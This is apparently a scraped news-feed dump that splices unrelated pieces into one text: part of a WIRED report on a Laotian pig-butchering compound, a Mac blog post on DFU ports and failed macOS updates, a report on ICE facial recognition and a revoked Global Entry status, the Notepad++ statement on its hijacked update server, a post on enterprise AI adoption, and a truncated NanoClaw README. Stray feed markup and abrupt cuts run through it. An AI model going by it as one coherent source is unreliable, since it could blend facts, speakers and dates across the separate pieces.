<div id="readability-page-1" class="page"><div><p><span>Just before 8am</span> one day last April, an office manager who went by the name Amani sent out a motivational message to his colleagues and subordinates. “Every day brings a new opportunity—a chance to connect, to inspire, and to make a difference,” he wrote in his 500-word post to an office-wide WhatsApp group. “Talk to that next customer like you're bringing them something valuable—because you are.”</p><p>Amani wasn’t rallying a typical corporate sales team. He and his underlings worked inside a “<a href="https://www.wired.com/story/what-is-pig-butchering-scam/">pig butchering</a>” compound, a criminal operation built to carry out <a href="https://www.wired.com/tag/scams/">scams</a>—promising romance and riches from <a href="https://www.wired.com/tag/cryptocurrency/">crypto</a> investments—that <a href="https://www.wired.com/story/pig-butchering-scam-invasion/">often</a> defraud victims out of hundreds of thousands or even millions of dollars at a time.</p><div data-testid="GenericCallout"><p><span><picture><img alt="Image may contain: City, Road, Street, Urban, Plant, Vegetation, Person, Walking, Palm Tree, Tree, Path, Helmet, and Outdoors" loading="lazy" srcset="https://media.wired.com/photos/695d063065851e41961fe045/master/w_120,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 120w, https://media.wired.com/photos/695d063065851e41961fe045/master/w_240,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 240w, https://media.wired.com/photos/695d063065851e41961fe045/master/w_320,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 320w, https://media.wired.com/photos/695d063065851e41961fe045/master/w_640,c_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg 640w" sizes="100vw" src="https://media.wired.com/photos/695d063065851e41961fe045/master/w_775%2Cc_limit/WIRED-FFRedBull-TheoTagholm-1-1080.jpg"></picture></span></p><div><p>Read the full story of WIRED's source, Mohammad Muzahir, <a href="https://www.wired.com/story/he-leaked-the-secrets-southeast-asian-scam-compound-then-had-to-get-out-alive">here</a>.</p></div></div><p>The workers Amani was addressing were eight hours into their 15-hour night shift in a high-rise building in the Golden Triangle special economic zone in Northern Laos. Like their marks, most of them were victims, too: forced laborers trapped in the compound, held in debt bondage with no passports. They struggled to meet scam revenue quotas to avoid fines that deepened their debt. Anyone who broke rules or attempted to escape faced far worse consequences: beatings, torture, even death.</p><p>The bizarre reality of daily life in a Southeast Asian scam compound—the tactics, the tone, the mix of cruelty and upbeat corporate prattle—is revealed at an unprecedented level of resolution in a leak of documents to WIRED from a whistleblower inside one such sprawling fraud operation. The facility, known as the Boshang compound, is one of dozens of scam operations across Southeast Asia that have enslaved hundreds of thousands of people. Often lured from the poorest regions of Asia and Africa with fake job offers, these conscripts have become engines of the most lucrative form of cybercrime in the world, coerced into stealing tens of billions of dollars.</p><p>Last June, one of those forced laborers, an Indian man named Mohammad Muzahir, contacted WIRED while he was still captive inside the scam compound that had trapped him. Over the following weeks, Muzahir, who initially identified himself only as “Red Bull,” shared with WIRED a trove of information about the scam operation. His leaks included internal documents, scam scripts, training guides, operational flowcharts, and photographs and videos from inside the compound.</p><p>Of all Muzahir’s leaks, the most revealing is a collection of screen recordings in which he scrolled through three months’ worth of the compound’s internal WhatsApp group chats. Those videos, which WIRED converted into 4,200 pages of screenshots, capture hour-by-hour conversations between the compound’s workers and their bosses—and the nightmare workplace culture of a pig butchering organization.</p><p>“It’s a slave colony that’s trying to pretend it’s a company,” says Erin West, a former Santa Clara County, California, prosecutor who leads an anti-scam organization called Operation Shamrock and who reviewed the chat logs obtained by WIRED. Another researcher who reviewed the leaked chat logs, Jacob Sims of Harvard University’s Asia Center, also remarked on their “Orwellian veneer of legitimacy.”</p><p>“It’s terrifying, because it’s manipulation <em>and</em> coercion,” says Sims, who studies Southeast Asian scam compounds. “Combining those two things together motivates people the most. And it’s one of the key reasons why these compounds are so profitable.”</p><p>In another chat message, sent within hours of Amani’s saccharine pep talk, a higher-level boss weighed in: “Don't resist the company's rules and regulations,” he wrote. “Otherwise you can't survive here.” The staffers responded with 26 emoji reactions, all thumbs-ups and salutes.</p><div data-testid="GenericCallout"><figure><p><span><picture><img alt="Image may contain Head Person Face Adult Crew Cut Hair Beard Photography and Portrait" loading="lazy" srcset="https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_120,c_limit/_SMK7032%20copy.jpg 120w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_240,c_limit/_SMK7032%20copy.jpg 240w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_320,c_limit/_SMK7032%20copy.jpg 320w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_640,c_limit/_SMK7032%20copy.jpg 640w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_960,c_limit/_SMK7032%20copy.jpg 960w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_1280,c_limit/_SMK7032%20copy.jpg 1280w, https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_1600,c_limit/_SMK7032%20copy.jpg 1600w" sizes="100vw" src="https://media.wired.com/photos/6968ea994dea1b57de3194ff/master/w_1600%2Cc_limit/_SMK7032%2520copy.jpg"></picture></span></p><p><span><p>Scam compound whistleblower Mohammad Muzahir, photographed in India after returning home from his ordeal as a forced laborer in the Golden Triangle.</p>

Yet the bosses in the chat frequently voiced their disappointment in the group’s performance, berated the staff for lack of effort, and imposed fine after fine.</p><p>Rather than explicit imprisonment, the compound relied on a system of indentured servitude and debt to control its workers. As Muzahir described it, he was paid a base salary of 3,500 Chinese yuan a month (about $500), which in theory entailed 75 hours a week of night shifts including breaks to eat. Although his passport had been taken from him, he was told that if he could pay off his “contract” with a $5,400 payment, it would be returned to him and he would be allowed to leave.</p></div></div>]]></description>

<h3>February 1 2026</h3>

<p>According to the Apple support document <a href="https://support.apple.com/120694">How to identify the DFU port on Mac</a>, the DFU (device firmware update) port location for MacBook Pro models with Apple silicon is as follows:</p>
<blockquote>
<ul><li><p><a href="https://support.apple.com/121552">14-inch MacBook Pro with M4 or M5 chip</a>: The rightmost USB-C port when you’re facing the left side of the Mac</p></li></ul>
<ul><li><p>All other models: The leftmost USB-C port when you’re facing the left side of the Mac</p></li></ul>
</blockquote>
<p>This is wrong, a discovery that took me about a half dozen attempts to update macOS on an external disk. I have a 16-inch MacBook Pro with an M4 chip, specifically an M4 Pro chip, and the DFU port seems to be the USB-C port on the <em>right</em> side of the Mac, not on the left side.</p>
<p>For some damn reason, it matters which port your external disk is plugged into when you install or update macOS, as described by the Apple support document <a href="https://support.apple.com/111336">How to use an external storage device as a Mac startup disk</a>:</p>
<blockquote>
<p>Make sure that your storage device is plugged into the appropriate port on your Mac.</p>
<ul><li><p>If you're using a <a href="https://support.apple.com/116943">Mac with Apple silicon</a>, plug your storage device into any compatible port except the DFU port. <a href="https://support.apple.com/120694">Learn how to identify the DFU port</a>. After macOS installation is complete, you can connect your storage device to any compatible port, including the DFU port.</p></li><li><p>If you’re using any other Mac, plug your storage device into any compatible port.</p></li></ul>
</blockquote>
<p>Mac disk management was so much easier in the days of Intel and PowerPC!</p>
<p>On an external SSD I had installed a macOS Sequoia boot volume (among others), which I’ve used to take Mac App Store screenshots for <a href="https://apps.apple.com/developer/jeff-johnson/id1176742298">my apps</a> and which I’d now like to use to take a screen recording. The installed version was still macOS 15.2, because I don’t often boot into the disk to take new screenshots, and going through the software update process would occupy my MacBook Pro for annoyingly long. However, it appears that Safari 26 requires a version of macOS 15 higher than .2, so I needed to update macOS in order to update Safari from version 18.</p>
<p>Over the past few days, every attempt I made to update the disk volume to macOS 15.7.3 failed inexplicably. I tried both Software Update in System Settings and the <code>softwareupdate</code> command-line tool in Terminal. They went through all the motions, downloading the entire update, rebooting, etc., but afterwards I always ended up right where I started, at macOS 15.2. The <code>softwareupdate</code> tool gave no error message. I did eventually see the following (truncated) notification:</p>
<p><img src="https://lapcatsoftware.com/articles/2026/2/1.png" width="379" height="86" alt="Some updates could not be installed"></p>
<p>Nonetheless, the so-called “Details” button presented no actual details, simply opening Software Update again in System Settings. At no point did it ever say, hey, plug your disk into a different port!</p>
<p>While searching for a solution to my problem, I found an article by Michael Tsai, <a href="https://mjtsai.com/blog/2025/04/11/failed-software-update-on-the-external-drive-of-an-apple-silicon-mac/">Failed Software Update on the External Drive of an Apple Silicon Mac</a>. It described something that I also saw in my testing:</p>
<blockquote>I happened to boot into macOS Recovery and look in the Startup Security Utility, and I saw that it did not have access to change the security policy for the external drive. In order to do that, it said I had to set the drive as the startup disk. This kind of didn’t make sense because don’t the security options get set when booted from Recovery?</blockquote>
<p>I followed Tsai’s instructions, which did allow me to change the security policy for the external drive.</p>
<blockquote>I don’t know why software update couldn’t tell me this or why there is seemingly no direct GUI command to view or edit the authorized users. But restarting <em>from within</em> <strong>Startup Disk</strong> is apparently the way to get macOS to offer to fix the LocalPolicy. Once I added the user, I was able to do a normal boot from the external drive and software update normally.</blockquote>
<p>I also thought this would solve my macOS update problem, but it didn’t. In retrospect, though, perhaps I needed <em>both</em> solutions, to fix the LocalPolicy and to change the ports.</p>
<p>I was about to surrender to despair when I discovered a second article by Michael Tsai, <a href="https://mjtsai.com/blog/2025/04/29/failing-to-finish-updating-macos-on-an-external-disk/">Failing to Finish Updating macOS on an External Disk</a>, published soon after the first article:</p>
<blockquote>With the final release of macOS 15.5, the problem got worse, and the Startup Disk workaround no longer helps.</blockquote>
<p>Tsai ultimately hits on the solution:</p>
<blockquote>The problem ended up being that I had plugged the external drive into the wrong USB-C port (the <a href="https://support.apple.com/en-us/120694">DFU port</a>).</blockquote>
<p>Sure enough, after plugging my disk into a port on the left side of my MacBook Pro, software update succeeded on the first attempt. Every previous, failed attempt used the port on the right side, which was physically more convenient on the desk. So after all that, the external disk is finally updated to macOS 15.7.3 now.</p>
<p>Tsai offers the same complaint about this absurd situation:</p>
<blockquote>I don’t know why macOS can’t just report an error when you use the wrong port instead of proceeding to install for an hour and then not report an error but not work, either.</blockquote>
<p>By the way, Software Update in System Settings allowed my Mac to go to sleep during the “Preparing” phase, despite the fact that the battery was charged to 99%, so when I returned home from a workout I unhappily found 30 minutes remaining. Sigh. Whatever happened to “it just works”?</p>

<p>Minnesota resident Nicole Cleland had her Global Entry and TSA Precheck privileges revoked three days after an incident in which she observed activity by immigration agents, the woman said in a court declaration. An agent told Cleland that he used facial recognition technology to identify her, she wrote in a <a href="https://storage.courtlistener.com/recap/gov.uscourts.mnd.229758/gov.uscourts.mnd.229758.98.0.pdf">declaration</a> filed in US District Court for the District of Minnesota.</p>
<p>Cleland, a 56-year-old resident of Richfield and a director at Target Corporation, volunteers with a group that tracks potential Immigration and Customs Enforcement (ICE) and Customs and Border Protection (CBP) vehicles in her neighborhood, according to her declaration. On the morning of January 10, she “observed a white Dodge Ram being driven by what I believed to be federal enforcement agents” and “maneuvered behind the vehicle with the intent of observing the agents’ actions.”</p>
<p>Cleland said that she and another observer in a different car followed the Dodge Ram because of “concern about a local apartment building being raided.” She followed the car for a short time and from a safe distance until “the Dodge Ram stopped in front of the other commuter’s vehicle,” she wrote. Cleland said two other vehicles apparently driven by federal agents stopped in front of the Dodge Ram, and her path forward was blocked.</p>
<p>“An agent exited the vehicle and approached my vehicle,” Cleland wrote. “I remained in my vehicle. The agent addressed me by my name and informed me that they had ‘facial recognition’ and that his body cam was recording. The agent stated that he worked for border patrol. He wore full camouflage fatigues. The agent stated that I was impeding their work. He indicated he was giving me a verbal warning and if I was found to be impeding again, I would be arrested.”</p>

          
                      
                  </div>
                    
        
          
    
    <div>
          
          
<p>Cleland acknowledged that she heard what the agent said, and they drove off in opposite directions, according to her declaration. Cleland submitted the declaration on January 21 in a <a href="https://storage.courtlistener.com/recap/gov.uscourts.mnd.229758/gov.uscourts.mnd.229758.1.0_4.pdf">lawsuit</a> filed by Minnesota residents against US government officials with the Department of Homeland Security and ICE. Cleland’s court filing was mentioned yesterday in a <a href="https://www.bostonglobe.com/2026/01/29/metro/ice-agents-intimidation-domestic-terrorist-database/">Boston Globe column</a> about tactics used by ICE agents to intimidate protesters.</p>
<h2>Global Entry and Precheck revoked</h2>
<p>Cleland said she could “discern no reason why the agents stopped me other than the fact that I was following them.” But on January 13, she received an email notification that her Global Entry and TSA Precheck privileges for passing through airport security were revoked, she said. Cleland said the revocation appears to be a form of intimidation and retaliation:</p>
<blockquote><p>I logged onto the Global Entry site and the notification letter indicated that indeed my status had been revoked and that they can’t always disclose the reason. The notification did provide some reasons that my status may have changed and the only one that makes sense was “The applicant has been found in violation of any customs, immigration, or agriculture regulations, procedures, or laws in any country.” I was not detained, I was not arrested so [it is] difficult to understand how I was “found in violation.”</p>
<p>I had been a member of the Global Entry program since 2014 without incident. I am not particularly concerned with the revocation of my privileges in isolation. However, given that only three days had passed from the time that I was stopped, I am concerned that the revocation was the result of me following and observing the agents. This is intimidation and retaliation. I was following Legal Observer laws. I [was] within my rights to be doing what I was doing.</p></blockquote>

<p>Cleland said she and her husband travel frequently, and she is worried that they may encounter problems going forward.</p>

    <div>

        
        <div>
          
          
<p>“I am concerned that border patrol and other federal enforcement agencies now have my license plate and personal information, and that I may be detained or arrested again in the future,” she wrote. “I am concerned about further actions that could be taken against me or my family. I have instructed my family to be cautious and return inside if they see unfamiliar vehicles outside of our home.”</p>
<p>Cleland said she hasn’t performed any observation of federal agents since January 10, but has “continued to engage in peaceful protests” and is “assessing when I will return to active observations.”</p>
<p>We contacted the Department of Homeland Security about Cleland’s declaration and will update this article if we get a response.</p>
<h2>Extensive use of facial recognition</h2>
<p>Federal agents have made <a href="https://arstechnica.com/tech-policy/2025/10/ices-forced-face-scans-to-verify-citizens-is-unconstitutional-lawmakers-say/">extensive use</a> of facial recognition during President Trump’s immigration crackdown with technology from <a href="https://immpolicytracking.org/policies/reported-ice-contracts-with-clearview-ai-for-facial-recognition-technology/">Clearview AI</a> and a face-scanning app called <a href="https://arstechnica.com/tech-policy/2025/11/us-gives-local-police-a-face-scanning-app-similar-to-one-used-by-ice-agents/">Mobile Fortify</a>. They use facial recognition technology both to verify citizenship and identify protesters.</p>
<p>“Ms. Cleland was one of at least seven American citizens told by ICE agents this month that they were being recorded with facial recognition technology in and around Minneapolis, according to local activists and videos posted to social media,” The New York Times <a href="https://www.nytimes.com/2026/01/30/technology/tech-ice-facial-recognition-palantir.html">reported</a> today, adding that none of the people had given consent to be recorded.</p>
<p>ICE also uses a <a href="https://www.washingtonpost.com/technology/interactive/2026/ice-surveillance-immigrants-protesters/">variety of other technologies</a>, including cell-site simulators (or Stingrays) to track phone locations, and <a href="https://www.404media.co/here-is-the-user-guide-for-elite-the-tool-palantir-made-for-ice/">Palantir software</a> to help identify potential deportation targets.</p>
<p>Although Cleland vowed to continue protesting and eventually get back to observing ICE and CBP agents, her declaration said she felt intimidated after the recent incident.</p>
<p>“The interaction with the agents on January 10th made me feel angry and intimidated,” she wrote. “I have been through Legal Observer Training and know my rights. I believe that I did not do anything that warranted being stopped in the way that I was on January 10th.”</p>

            <description><![CDATA[<p>URL: <a href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/">https://notepad-plus-plus.org/news/hijacked-incident-info-update/</a>, See on <a href="https://news.ycombinator.com/item?id=46851548">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
    
    <p>2026-02-02</p>

<p>Following the security disclosure published in the v8.8.9 announcement<br>
<a href="https://notepad-plus-plus.org/news/v889-released/">https://notepad-plus-plus.org/news/v889-released/</a><br>
the investigation has continued in collaboration with external experts and with the full involvement of my (now former) shared hosting provider.</p>

<p>According to the analysis provided by the security experts, the attack involved infrastructure-level compromise that allowed malicious actors to intercept and redirect update traffic destined for notepad-plus-plus.org. The exact technical mechanism remains under investigation, though the compromise occured at the hosting provider level rather than through vulnerabilities in Notepad++ code itself. Traffic from certain targeted users was selectively redirected to attacker-controlled served malicious update manifests.</p>

<p>The incident began from June 2025. Multiple independaent security researchers have assessed that the threat acotor is likely a Chinese state-sponsored group, which would explain the highly selective targeting obseved during the campaign.</p>

<p>An incident-response (IR) plan was proposed by the security expert, and I facilitated direct communication between the hosting provider and the IR team. After the IR team engaged with the provider and reviewed the situation, I received the following detailed statement from the provider:</p>

<pre><code>Dear Customer,
We want to further update you following the previous communication with us about your server compromise and further investigation with your incident response team.
We discovered the suspicious events in our logs, which indicate that the server (where your application https://notepad-plus-plus.org/update/getDownloadUrl.php was hosted until the 1st of December, 2025) could have been compromised.
As a precautionary measure, we immediately transferred all clients’ web hosting subscriptions from this server to a new server and continued our further investigation.
Here are the key finding points:
1. The shared hosting server in question was compromised until the 2nd of September, 2025. On this particular date, the server had scheduled maintenance where the kernel and firmware were updated. After this date, we could not identify any similar patterns in logs, and this indicates that bad actors have lost access to the server. We also find no evidence of similar patterns on any other shared hosting servers.
2. Even though the bad actors have lost access to the server from the 2nd of September, 2025, they maintained the credentials of our internal services existing on that server until the 2nd of December, which could have allowed the malicious actors to redirect some of the traffic going to https://notepad-plus-plus.org/getDownloadUrl.php to their own servers and return the updates download URL with compromised updates.
3. Based on our logs, we see no other clients hosted on this particular server being targeted. The bad actors specifically searched for https://notepad-plus-plus.org/ domain with the goal to intercept the traffic to your website, as they might know the then-existing Notepad++ vulnerabilities related to insufficient update verification controls.
4. After concluding our research, the investigated security findings were no longer observed in the web hosting systems from the 2nd of December, 2025, and onwards, as:
* We have fixed vulnerabilities, which could have been used to target Notepad++. In particular, we do have logs indicating that the bad actor tried to re-exploit one of the fixed vulnerabilities; however, the attempt did not succeed after the fix was implemented.
* We have rotated all the credentials that bad actors could have obtained until the 2nd of September, 2025.
* We have checked the logs for similar patterns in all web hosting servers and couldn’t find any evidence of systems being compromised, exploited in a similar way, or data breached.
While we have rotated all the secrets on our end, below you will find the preventive actions you should take to maximize your security. However, if below actions have been done after the 2nd of December, 2025, no actions are needed from your side.
* Change credentials for SSH, FTP/SFTP, and MySQL database.
* Review administrator accounts for your WordPress sites (if you have any), change their passwords, and remove unnecessary users.
* Update your WordPress sites (if you have any) plugins, themes, and core version, and turn on automatic updates, if applicable.
We appreciate your cooperation and understanding. Please let us know in case you have any questions.
</code></pre>

<p><strong>TL;DR</strong><br>
According to the former hosting provider, the shared hosting server was compromised until September 2, 2025. Even after losing server access, attackers maintained credentials to internal services until December 2, 2025, which allowed them to continue redirecting Notepad++ update traffic to malicious servers. The attackers specifically targeted Notepad++ domain with the goal of exploiting insufficient update verification controls that existed in older versions of Notepad++.
All remediation and security hardening were completed by the provider by December 2, 2025, successfully blocking further attacker activity.</p>

<p><strong>Note on timelines:</strong> The security exper’s analysis indicates the attack ceased on November 10, 2025, while the hosting provider’s statement shows potential attacker access until December 2, 2025. Based on both assessment, I estimate the overall compromise period spanned from June through December 2, 2025, when all attacker access was definitively terminated.</p>

<p>I deeply apologize to all users affected by this hijacking. To address this this severe security issue, the Notepad++ website has been migrated to a new hosting provider with significantly stronger security practices.
Within Notepad++ itself, WinGup (the updater) was enhanced in v8.8.9 to verify both the certificate and the signature of the downloaded installer. Additionally, the XML returned by the update server is now singed (XMLDSig), and the certificate &amp; signature verification will be enforced starting with upcoming v8.9.2, expected in about one month.</p>

<p>With these changes and reinforcements, I believe the situation has been fully resolved.
Fingers crossed.</p>

<div id="readability-page-1" class="page"><div>
            <p>It still shocks me how much difference there is between AI users. I think it explains a lot about the often confusing (to me) coverage in the media about AI and its productivity impact.</p>
<p>I think it's clear there are two types of users to me now, and by extension, the organisations they work for.</p>
<p>First, you have the "power users", who are all in on adopting new AI technology - Claude Code, MCPs, skills, etc. Surprisingly, these people are often <em>not very technical</em>. I've seen far more non-technical people than I'd expect using Claude Code in terminal, using it for dozens of non-SWE tasks. Finance roles seem to be getting enormous value out of it (unsurprisingly, as Excel on the finance side is remarkably limiting when you start getting used to the power of a full programming ecosystem like Python).</p>
<p>Secondly, you have the people who are generally only chatting to ChatGPT or similar. <em>So many</em> people I wouldn't expect are still in this camp.</p>
<h2>M365 Copilot has a lot to answer for</h2>
<p>One extremely jarring realisation was just how poor Microsoft Copilot is. It has <em>enormous</em> market share in enterprise as it is bundled in with various Office 365 subscriptions, yet feels like a poorly cloned version of the (already not great) ChatGPT interface. The "agent" feature is absolutely laughable compared to what a CLI coding agent (including Microsoft's own GitHub confusingly-named-Copilot CLI).</p>
<blockquote>
<p>To really underline this, Microsoft itself is rolling out Claude Code to internal teams<sup><a href="#fn1" id="fnref1">[1]</a></sup>, despite (obviously) having access to Copilot at near zero cost, and significant ownership of OpenAI. I think this sums up quite how far behind they are</p>
</blockquote>
<p>The problem is that in enterprise Copilot is often the only allowed AI tool, so that's all you can use without either potentially losing your job or spending a lot of effort trying to procure and use another AI tool. It's slow, the code execution tool in it doesn't work properly and fails horribly with large(ish) files, seemingly due to very very aggressive memory and CPU limitations.</p>
<p>This is becoming an existential risk for many enterprises. Senior decision makers are no doubt using these tools with such poor results and are therefore writing off AI, and/or spending a fortune with various large consulting and management consultancy outfits to get not very far.</p>
<h2>Why enterprise is so at risk</h2>
<p>Enterprise corporate IT policy results in a completely disastrous combination of limitations that basically ensure that people cannot successfully use more 'cutting edge' AI tooling.</p>
<p>Firstly, they tend to have extremely locked down environments, with no ability to run even a basic script interpreter locally (VBA if you are lucky, but even that may be limited by various Group Policies). Secondly, they're locked into legacy software with no real "internal facing" APIs on their core workflows, which means agents have nothing to connect to even if you could run them.</p>
<p>Finally, they tend to have extremely siloed engineering departments (which may be completely outsourced), so there's nobody internally who could build the infrastructure to run safely sandboxed agents even if they wanted to.</p>
<p>The security concerns are real. You definitely do not want people YOLOing coding agents over production databases with no control, and <a href="https://martinalderson.com/posts/why-sandboxing-coding-agents-is-harder-than-you-think/">as I've covered</a>, sandboxing agents is <em>difficult</em><sup><a href="#fn2" id="fnref2">[2]</a></sup>.</p>
<p>However, this does cause a real problem in so much that you don't have an engineering team that can help build the infrastructure to run safely sandboxed agents against your datasets.</p>

<p>I've also spoken to many smaller companies that don't have all this baggage and are <em>absolutely flying</em> with AI. The gap is so obvious when you can see both sides of it.</p>
<p>On one hand, you have Microsoft's (awful) Copilot integration for Excel (in fairness, the Gemini integration in Google Sheets is also bad). So you can imagine financial directors trying to use it and it making a complete mess of the most simple tasks and never touching it again.</p>
<p>On the other you have a non-technical executive who's got his head round Claude Code and can run e.g. Python locally. I helped one recently almost one-shot<sup><a href="#fn3" id="fnref3">[3]</a></sup> converting a 30 sheet mind numbingly complicated Excel financial model to Python with Claude Code.</p>
<p>Once the model is in Python, you effectively have a data science team in your pocket with Claude Code. You can easily run Monte Carlo simulations, pull external data sources as inputs, build web dashboards and have Claude Code work with you to really integrate weaknesses in your model (or business). It's a pretty magical experience watching someone realise they have so much power at their fingertips, without having to grind away for hours/days in Excel.</p>
<p>This effectively leads to a situation where smaller company employees are able to be <em>so much</em> more productive than the equivalent at an enterprise. It often used to be that people at small companies really envied the resources &amp; teams that their larger competitors had access to - but increasingly I think the pendulum is swinging the other way.</p>
<h2>The future</h2>
<p>I'm starting to get a feel for what the future of work looks like. The first observation is that (often) the real leaps are being made organically by employees, not from a top down AI strategy. Where I see the real productivity gains are small teams deciding to try and build an AI assisted workflow for a process, and as they are the ones that know that process inside out they can get very good results - unlike an often outsourced software engineering team who have absolutely zero experience doing the process that they are helping automate. I think this is the opposite of what most 'digital transformation' projects looked like in enterprise.</p>
<p>Secondly, companies that have some sort of APIs for <em>internal</em> systems are going to be able to do far more than those that don't. This might be as simple as a readonly data warehouse employees can connect to and run queries on behalf of users, or it could be as far as many complex core business processes being completely APId.</p>
<p>Thirdly, this all needs to be wrapped up in some sort of secure mechanism, but I actually think a hosted VM running some sort of code agent with well thought through network restrictions would work well, at least for read only reporting. For creating and editing data I don't think we quite have the model for non technical users (especially) to be able to use agents safely (yet).</p>
<p>Finally, legacy enterprise SaaS players either have enormous lock in, or are extremely vulnerable depending on how you look at it. Most are not "API-first" products, and the APIs they have tend to be really for developer usage - not optimised for thousands of employees to ping in weird and wonderful inefficient ways. But if they are the source of truth for the company, they are going to be very difficult to migrate away from <em>and</em> bottleneck a lot of productivity gains.</p>
<p>Again, smaller companies tend to use newer products which have far better thought through APIs (simply because they weren't often originally created many decades ago with various interfaces grafted on over time).</p>
<p><img src="https://martinalderson.com/img/future-of-work-flowchart.png" alt="The future of knowledge work - user prompting an agent that connects to systems via APIs and generates outputs"></p><blockquote>
<p>The user prompts, the agent synthesises - connecting to APIs and producing outputs on demand.</p>
</blockquote>
<p>What I've come to realise is that the power of having a <a href="https://martinalderson.com/posts/why-im-building-my-own-clis-for-agents/">bash sandbox</a> with a programming language and API access to systems, combined with an agentic harness, results in outrageously good results for non technical users. It can effectively replace nearly every standard productivity app out there - both classic Microsoft Office style ones - and also web apps. It can build any report you ask for - and export it however you like. To me this seems like the future of knowledge work.</p>
<p>The bifurcation is real and seems to be, if anything, speeding up dramatically. I don't think there's ever been a time in history where a tiny team can outcompete a company one thousand times its size so easily.</p>

  My personal Claude assistant that runs securely in Apple containers. Lightweight and built to be understood and customized for your own needs.
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why I Built This</h2><a id="user-content-why-i-built-this" aria-label="Permalink: Why I Built This" href="#why-i-built-this"></a></p>
<p dir="auto"><a href="https://github.com/openclaw/openclaw">OpenClaw</a> is an impressive project with a great vision. But I can't sleep well running software I don't understand with access to my life. OpenClaw has 52+ modules, 8 config management files, 45+ dependencies, and abstractions for 15 channel providers. Security is application-level (allowlists, pairing codes) rather than OS isolation. Everything runs in one Node process with shared memory.</p>
<p dir="auto">NanoClaw gives you the same core functionality in a codebase you can understand in 8 minutes. One process. A handful of files. Agents run in actual Linux containers with filesystem isolation, not behind permission checks.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/gavrielc/nanoclaw.git
cd nanoclaw
claude"><pre>git clone https://github.com/gavrielc/nanoclaw.git
<span>cd</span> nanoclaw
claude</pre></div>
<p dir="auto">Then run <code>/setup</code>. Claude Code handles everything: dependencies, authentication, container setup, service configuration.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Philosophy</h2><a id="user-content-philosophy" aria-label="Permalink: Philosophy" href="#philosophy"></a></p>
<p dir="auto"><strong>Small enough to understand.</strong> One process, a few source files. No microservices, no message queues, no abstraction layers. Have Claude Code walk you through it.</p>
<p dir="auto"><strong>Secure by isolation.</strong> Agents run in Linux containers (Apple Container). They can only see what's explicitly mounted. Bash access is safe because commands run inside the container, not on your Mac.</p>
<p dir="auto"><strong>Built for one user.</strong> This isn't a framework. It's working software that fits my exact needs. You fork it and have Claude Code make it match your exact needs.</p>
<p dir="auto"><strong>Customization = code changes.</strong> No configuration sprawl. Want different behavior? Modify the code. The codebase is small enough that this is safe.</p>
<p dir="auto"><strong>AI-native.</strong> No installation wizard; Claude Code guides setup. No monitoring dashboard; ask Claude what's happening. No debugging tools; describe the problem, Claude fixes it.</p>
<p dir="auto"><strong>Skills over features.</strong> Contributors shouldn't add features (e.g. support for Telegram) to the codebase. Instead, they contribute skills like <code>/add-telegram</code> that transform your fork. You end up with clean code that does exactly what you need.</p>
<p dir="auto"><strong>Best harness, best model.</strong> This runs on Claude Agent SDK, which means you're running Claude Code directly. The harness matters. A bad harness makes even smart models seem dumb, a good harness gives them superpowers. Claude Code is (IMO) the best harness available.</p>
<p dir="auto"><strong>No ToS gray areas.</strong> Because it uses Claude Agent SDK natively with no hacks or workarounds, using your subscription with your auth token is completely legitimate (I think). No risk of being shut down for terms of service violations (I am not a lawyer).</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What It Supports</h2><a id="user-content-what-it-supports" aria-label="Permalink: What It Supports" href="#what-it-supports"></a></p>
<ul dir="auto">
<li><strong>WhatsApp I/O</strong> - Message Claude from your phone</li>
<li><strong>Isolated group context</strong> - Each group has its own <code>CLAUDE.md</code> memory, isolated filesystem, and runs in its own container sandbox with only that filesystem mounted</li>
<li><strong>Main channel</strong> - Your private channel (self-chat) for admin control; every other group is completely isolated</li>
<li><strong>Scheduled tasks</strong> - Recurring jobs that run Claude and can message you back</li>
<li><strong>Web access</strong> - Search and fetch content</li>
<li><strong>Container isolation</strong> - Agents sandboxed in Apple containers</li>
<li><strong>Optional integrations</strong> - Add Gmail (<code>/add-gmail</code>) and more via skills</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>

<p dir="auto">There are no configuration files to learn. Just tell Claude Code what you want:</p>
<ul dir="auto">
<li>"Change the trigger word to @Bob"</li>
<li>"Remember in the future to make responses shorter and more direct"</li>
<li>"Add a custom greeting when I say good morning"</li>
<li>"Store conversation summaries weekly"</li>
</ul>
<p dir="auto">Or run <code>/customize</code> for guided changes.</p>
<p dir="auto">The codebase is small enough that Claude can safely modify it.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto"><strong>Don't add features. Add skills.</strong></p>
<p dir="auto">If you want to add Telegram support, don't create a PR that adds Telegram alongside WhatsApp. Instead, contribute a skill file (<code>.claude/skills/add-telegram/SKILL.md</code>) that teaches Claude Code how to transform a NanoClaw installation to use Telegram.</p>
<p dir="auto">Users then run <code>/add-telegram</code> on their fork and get clean code that does exactly what they need, not a bloated system trying to support every use case.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">RFS (Request for Skills)</h3><a id="user-content-rfs-request-for-skills" aria-label="Permalink: RFS (Request for Skills)" href="#rfs-request-for-skills"></a></p>
<p dir="auto">Skills we'd love to see:</p>
<p dir="auto"><strong>Communication Channels</strong></p>
<ul dir="auto">
